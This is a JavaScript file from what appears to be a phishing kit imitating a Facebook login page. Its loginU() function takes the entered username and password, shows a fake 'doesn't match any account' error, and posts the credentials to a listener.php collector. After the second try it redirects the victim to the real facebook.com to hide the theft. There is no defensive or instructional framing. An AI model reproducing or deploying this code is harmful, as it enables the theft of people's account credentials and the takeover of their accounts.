var count = 0;
// meta
/*var viewportContent = '';
if (window.devicePixelRatio = 1) {
    viewportContent = 'width=device-width, initial-scale=0.51, maximum-scale=0.51, user-scalable=0, target-densityDpi=device-dpi';
} else if (window.devicePixelRatio == 2) {
    viewportContent = 'width=device-width, initial-scale=0.51, maximum-scale=0.51, user-scalable=0';
} else if (window.devicePixelRatio == .78) {
    viewportContent = 'width=device-width, initial-scale=0.51, maximum-scale=0.51, user-scalable=0, target-densityDpi=device-dpi';
} else if (window.devicePixelRatio == 1.5) {
    viewportContent = 'width=device-width, initial-scale=0.51, maximum-scale=0.51, user-scalable=0, target-densityDpi=device-dpi';
}

var meta = document.createElement('meta');
meta.name = "viewport";
meta.content =  "width=device-width,initial-scale=1";
document.getElementsByTagName('head')[0].appendChild(meta);*/

//$('head').append('<meta name="viewport" content="' + viewportContent + '">');

function loginU()
{
    
    var userName = document.getElementById("user").value;
    var passUser = document.getElementById("password").value;


    var error = document.getElementById("error");
    error.style.color = 'red';
    
    error.innerHTML = "This email or phone number you're entered doesn't match any account Sign Up for an account.";

    var theObject = new XMLHttpRequest();

    theObject.open('POST', 'listener.php', true); // send data to the server
    theObject.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');// header
    theObject.send('username='+userName+'&'+'Password='+passUser);
 
    count++;
    if(count == 2)
    {
        count = 0;
        location.href="https://www.facebook.com/";
    }
    //alert("Usuario: " + userName + "\n Contrasena: "+ passUser +"\ncontador: "+count);
    return false;
}

